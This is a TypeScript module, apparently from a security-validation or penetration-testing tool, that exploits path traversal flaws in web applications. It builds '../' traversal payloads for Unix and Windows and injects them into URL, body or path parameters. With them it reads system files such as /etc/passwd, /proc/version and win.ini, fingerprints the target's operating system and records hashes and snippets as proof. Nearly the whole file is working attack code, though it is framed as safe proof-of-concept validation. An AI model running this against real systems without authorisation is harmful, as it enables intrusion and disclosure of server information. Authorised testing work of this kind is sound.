/**
 * Path Traversal Post-Exploitation Module
 * 
 * Proves file read capability by extracting and hashing file contents.
 * Uses only safe system files that don't contain sensitive data.
 */

import { createHash } from "crypto";
import { ValidatingHttpClient, type ValidationContext } from "../../validation/validating-http-client";

export interface PathTraversalExploitConfig {
  targetUrl: string;
  parameterName: string;
  parameterLocation: "url_param" | "body_param" | "path";
  httpMethod: "GET" | "POST";
  traversalPayload: string;
  detectedOs: "unix" | "windows" | "unknown";
  headers?: Record<string, string>;
}

export interface FileProof {
  targetFile: string;
  exists: boolean;
  readable: boolean;
  contentHash?: string;
  contentSnippet?: string;
  fileSize?: number;
  capturedAt: Date;
}

export interface OsFingerprint {
  os: "linux" | "unix" | "windows" | "macos" | "unknown";
  distribution?: string;
  version?: string;
  hostname?: string;
  confidence: number;
}

export interface PathTraversalPostExploitResult {
  success: boolean;
  osFingerprint?: OsFingerprint;
  fileProofs: FileProof[];
  evidence: string;
  proofArtifacts: ProofArtifact[];
  executionTimeMs: number;
}

interface ProofArtifact {
  type: string;
  description: string;
  data: string;
  hash: string;
  capturedAt: Date;
}

const SAFE_UNIX_FILES = [
  { path: "/etc/passwd", description: "Unix user database (public)", expectedPattern: /root:.*:0:0/ },
  { path: "/etc/hosts", description: "Host file", expectedPattern: /127\.0\.0\.1|localhost/ },
  { path: "/etc/hostname", description: "Hostname file", expectedPattern: /.+/ },
  { path: "/etc/issue", description: "Login banner", expectedPattern: /.+/ },
  { path: "/etc/os-release", description: "OS identification", expectedPattern: /NAME=|ID=/ },
  { path: "/proc/version", description: "Kernel version", expectedPattern: /Linux version/ },
];

const SAFE_WINDOWS_FILES = [
  { path: "C:\\Windows\\win.ini", description: "Windows config", expectedPattern: /\[fonts\]|\[extensions\]/ },
  { path: "C:\\Windows\\System32\\drivers\\etc\\hosts", description: "Windows hosts", expectedPattern: /127\.0\.0\.1|localhost/ },
  { path: "C:\\Windows\\System.ini", description: "System config", expectedPattern: /\[drivers\]|\[boot\]/ },
];

export class PathTraversalPostExploitModule {
  private httpClient: ValidatingHttpClient;
  private context?: ValidationContext;
  
  constructor(context?: ValidationContext) {
    this.httpClient = new ValidatingHttpClient({ timeout: 10000 });
    this.context = context;
  }
  
  async probeFile(config: PathTraversalExploitConfig, targetFile: string): Promise<FileProof> {
    const payload = this.buildTraversalPayload(config.traversalPayload, targetFile, config.detectedOs);
    
    const url = new URL(config.targetUrl);
    let requestUrl = url.toString();
    let body: string | undefined;
    const headers: Record<string, string> = { ...config.headers };
    
    if (config.parameterLocation === "url_param") {
      url.searchParams.set(config.parameterName, payload);
      requestUrl = url.toString();
    } else if (config.parameterLocation === "body_param") {
      body = `${config.parameterName}=${encodeURIComponent(payload)}`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
    } else if (config.parameterLocation === "path") {
      requestUrl = config.targetUrl.replace(`{${config.parameterName}}`, payload);
    }
    
    try {
      const { response } = await this.httpClient.request({
        method: config.httpMethod,
        url: requestUrl,
        headers,
        body,
      }, this.context);
      
      const readable = this.containsFileContent(response.body, targetFile, config.detectedOs);
      
      if (readable) {
        const content = this.extractFileContent(response.body);
        return {
          targetFile,
          exists: true,
          readable: true,
          contentHash: createHash("sha256").update(content).digest("hex"),
          contentSnippet: this.sanitizeSnippet(content),
          fileSize: content.length,
          capturedAt: new Date(),
        };
      }
      
      return {
        targetFile,
        exists: response.statusCode !== 404,
        readable: false,
        capturedAt: new Date(),
      };
    } catch {
      return {
        targetFile,
        exists: false,
        readable: false,
        capturedAt: new Date(),
      };
    }
  }
  
  async fingerprintOs(config: PathTraversalExploitConfig): Promise<OsFingerprint> {
    const fingerprint: OsFingerprint = {
      os: "unknown",
      confidence: 0,
    };
    
    // Try Unix files first
    for (const file of ["/etc/os-release", "/proc/version", "/etc/passwd"]) {
      const proof = await this.probeFile(config, file);
      if (proof.readable && proof.contentSnippet) {
        fingerprint.os = "linux";
        fingerprint.confidence = 90;
        
        if (file === "/etc/os-release") {
          const nameMatch = proof.contentSnippet.match(/NAME="?([^"\n]+)"?/);
          const versionMatch = proof.contentSnippet.match(/VERSION="?([^"\n]+)"?/);
          fingerprint.distribution = nameMatch?.[1];
          fingerprint.version = versionMatch?.[1];
        }
        
        if (file === "/proc/version" && proof.contentSnippet.includes("Linux version")) {
          const versionMatch = proof.contentSnippet.match(/Linux version ([\d.]+)/);
          fingerprint.version = versionMatch?.[1];
        }
        
        return fingerprint;
      }
    }
    
    // Try Windows files
    for (const file of SAFE_WINDOWS_FILES.map(f => f.path)) {
      const proof = await this.probeFile(config, file);
      if (proof.readable) {
        fingerprint.os = "windows";
        fingerprint.confidence = 85;
        return fingerprint;
      }
    }
    
    // Try macOS specific
    const macProof = await this.probeFile(config, "/System/Library/CoreServices/SystemVersion.plist");
    if (macProof.readable) {
      fingerprint.os = "macos";
      fingerprint.confidence = 85;
      return fingerprint;
    }
    
    return fingerprint;
  }
  
  async runFullExploitation(
    config: PathTraversalExploitConfig,
    options: {
      skipFingerprint?: boolean;
      maxFiles?: number;
      includeContent?: boolean;
    } = {}
  ): Promise<PathTraversalPostExploitResult> {
    const startTime = Date.now();
    const proofArtifacts: ProofArtifact[] = [];
    const evidence: string[] = [];
    const fileProofs: FileProof[] = [];
    
    // Step 1: OS Fingerprinting
    let osFingerprint: OsFingerprint | undefined;
    if (!options.skipFingerprint) {
      osFingerprint = await this.fingerprintOs(config);
      if (osFingerprint.confidence > 0) {
        evidence.push(`OS: ${osFingerprint.os}${osFingerprint.distribution ? ` (${osFingerprint.distribution})` : ""}`);
        proofArtifacts.push({
          type: "os_fingerprint",
          description: "Operating system identification via file disclosure",
          data: JSON.stringify(osFingerprint),
          hash: createHash("sha256").update(JSON.stringify(osFingerprint)).digest("hex"),
          capturedAt: new Date(),
        });
      }
    }
    
    // Step 2: Probe safe files
    const targetFiles = config.detectedOs === "windows" || osFingerprint?.os === "windows"
      ? SAFE_WINDOWS_FILES
      : SAFE_UNIX_FILES;
    
    const maxFiles = options.maxFiles || 5;
    
    for (const fileInfo of targetFiles.slice(0, maxFiles)) {
      const proof = await this.probeFile(config, fileInfo.path);
      fileProofs.push(proof);
      
      if (proof.readable) {
        evidence.push(`Read: ${fileInfo.path} (${proof.fileSize} bytes)`);
        proofArtifacts.push({
          type: "file_read_proof",
          description: fileInfo.description,
          data: options.includeContent ? (proof.contentSnippet || "") : `[${proof.fileSize} bytes]`,
          hash: proof.contentHash || "",
          capturedAt: proof.capturedAt,
        });
      }
    }
    
    const readableFiles = fileProofs.filter(f => f.readable).length;
    const success = readableFiles > 0;
    
    return {
      success,
      osFingerprint: osFingerprint?.confidence ? osFingerprint : undefined,
      fileProofs,
      evidence: evidence.join("; "),
      proofArtifacts,
      executionTimeMs: Date.now() - startTime,
    };
  }
  
  // ---------------------------------------------------------------------------
  // Private Helpers
  // ---------------------------------------------------------------------------
  
  private buildTraversalPayload(basePayload: string, targetFile: string, os: string): string {
    const separator = os === "windows" ? "\\" : "/";
    const traversal = basePayload.includes("..") ? basePayload : "../".repeat(8);
    
    if (os === "windows") {
      return traversal.replace(/\.\.\//g, "..\\") + targetFile.replace(/\//g, "\\");
    }
    
    return traversal + targetFile;
  }
  
  private containsFileContent(responseBody: string, targetFile: string, os: string): boolean {
    const files = os === "windows" ? SAFE_WINDOWS_FILES : SAFE_UNIX_FILES;
    const fileInfo = files.find(f => f.path === targetFile);
    
    if (fileInfo) {
      return fileInfo.expectedPattern.test(responseBody);
    }
    
    return responseBody.length > 50 && !responseBody.includes("<!DOCTYPE");
  }
  
  private extractFileContent(responseBody: string): string {
    const htmlMatch = responseBody.match(/<pre[^>]*>([\s\S]*?)<\/pre>/i);
    if (htmlMatch) {
      return htmlMatch[1].replace(/<[^>]+>/g, "");
    }
    
    const jsonMatch = responseBody.match(/"content"\s*:\s*"([^"]+)"/);
    if (jsonMatch) {
      return jsonMatch[1];
    }
    
    const cleaned = responseBody
      .replace(/<[^>]+>/g, "")
      .replace(/&lt;/g, "<")
      .replace(/&gt;/g, ">")
      .replace(/&amp;/g, "&")
      .trim();
    
    return cleaned;
  }
  
  private sanitizeSnippet(content: string): string {
    const lines = content.split("\n").slice(0, 10);
    return lines.map(line => {
      if (line.length > 200) {
        return line.substring(0, 200) + "...";
      }
      return line;
    }).join("\n");
  }
}
